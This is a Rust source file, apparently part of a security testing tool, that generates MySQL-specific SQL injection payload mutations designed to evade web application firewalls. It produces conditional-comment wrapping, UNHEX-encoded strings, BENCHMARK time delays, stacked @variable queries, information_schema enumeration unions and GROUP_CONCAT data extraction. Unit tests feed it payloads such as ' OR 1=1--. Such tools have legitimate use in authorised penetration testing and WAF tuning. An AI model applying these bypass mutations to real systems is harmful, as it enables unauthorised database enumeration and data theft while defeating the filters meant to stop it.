//! MySQL-specific SQL grammar mutations.
//!
//! MySQL has the richest set of WAF bypass primitives of any SQL dialect:
//! - Conditional comments (`/*!50000 SELECT */`) that only execute above a version
//! - Backtick identifier quoting
//! - `@` session variables
//! - Charset function tricks (CONVERT, CAST, BINARY)
//! - Integer/string type juggling
//! - Information schema enumeration

/// MySQL conditional comment wrapper.
pub const CONDITIONAL_COMMENTS: &[&str] = &["/*!50000 ", "/*!00000 ", "/*!"];

/// Generate MySQL-specific mutations for a payload.
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
    let mut results = Vec::new();
    let lower = payload.to_ascii_lowercase();

    // ── Conditional comments around keywords ──
    for prefix in CONDITIONAL_COMMENTS {
        if results.len() >= max_mutations {
            break;
        }
        if lower.contains("select") {
            results.push(payload.replace("SELECT ", &format!("{prefix}SELECT ")));
            results.push(payload.replace("select ", &format!("{prefix}select ")));
        }
        if lower.contains("union") {
            results.push(payload.replace("UNION ", &format!("{prefix}UNION ")));
        }
    }
    // Close conditional comments
    for item in &mut results {
        if item.contains("/*!") && !item.contains("*/") {
            *item = format!("{item}*/");
        }
    }

    // ── Backtick identifier quoting ──
    if lower.contains("from ") {
        results.push(
            payload
                .replace("FROM ", "FROM `")
                .replace(" WHERE", "` WHERE"),
        );
    }

    // ── Time-based alternatives ──
    if lower.contains("sleep(") {
        results.push(payload.replace("SLEEP(", "BENCHMARK(1000000,MD5(1))"));
        results.push(payload.replace("SLEEP(", "BENCHMARK(5000000,SHA1(1))"));
    }

    // ── @variable injection ──
    // Set a variable then use it — WAFs don't track variable state
    if lower.contains("' or ") || lower.contains("' and ") {
        results.push(format!("'; SET @a=1; SELECT @a;{}", payload.split("--").last().unwrap_or("")));
    }

    // ── Charset function obfuscation ──
    if lower.contains("char(") {
        results.push(payload.replace("CHAR(", "CONVERT("));
    }

    // ── HEX/UNHEX string construction ──
    // Construct 'admin' as UNHEX('61646D696E')
    if let Some(start) = payload.find('\'')
        && let Some(end) = payload[start + 1..].find('\'') {
            let inner = &payload[start + 1..start + 1 + end];
            if !inner.is_empty() && inner.len() <= 20 {
                let hex: String = inner.bytes().map(|b| format!("{b:02x}")).collect();
                results.push(format!(
                    "{}UNHEX('{}'){}",
                    &payload[..start],
                    hex,
                    &payload[start + 1 + end + 1..]
                ));
            }
        }

    // ── Information schema enumeration payloads ──
    if results.len() < max_mutations {
        results.push(format!(
            "{} UNION SELECT table_name,NULL FROM information_schema.tables--",
            payload.trim_end_matches("--").trim_end_matches('#')
        ));
        results.push(format!(
            "{} UNION SELECT column_name,NULL FROM information_schema.columns--",
            payload.trim_end_matches("--").trim_end_matches('#')
        ));
    }

    // ── GROUP_CONCAT for data exfiltration ──
    if lower.contains("select") && results.len() < max_mutations {
        results.push(payload.replace("SELECT ", "SELECT GROUP_CONCAT("));
    }

    // ── Binary keyword prefix ──
    // BINARY keyword forces byte-level comparison, evading some filters
    if lower.contains("'") && results.len() < max_mutations {
        results.push(payload.replacen("'", "BINARY '", 1));
    }

    results.truncate(max_mutations);
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn conditional_comment_generated() {
        let mutations = mutate("SELECT * FROM users", 50);
        assert!(mutations.iter().any(|m| m.contains("/*!")));
    }

    #[test]
    fn benchmark_alternative() {
        let mutations = mutate("SLEEP(5)", 50);
        assert!(mutations.iter().any(|m| m.contains("BENCHMARK")));
    }

    #[test]
    fn information_schema_generated() {
        let mutations = mutate("' OR 1=1--", 50);
        assert!(mutations.iter().any(|m| m.contains("information_schema")));
    }

    #[test]
    fn hex_string_construction() {
        let mutations = mutate("' OR 'admin'='admin'--", 50);
        assert!(mutations.iter().any(|m| m.contains("UNHEX")));
    }

    #[test]
    fn binary_prefix() {
        let mutations = mutate("' OR 1=1--", 50);
        assert!(mutations.iter().any(|m| m.contains("BINARY")));
    }
}
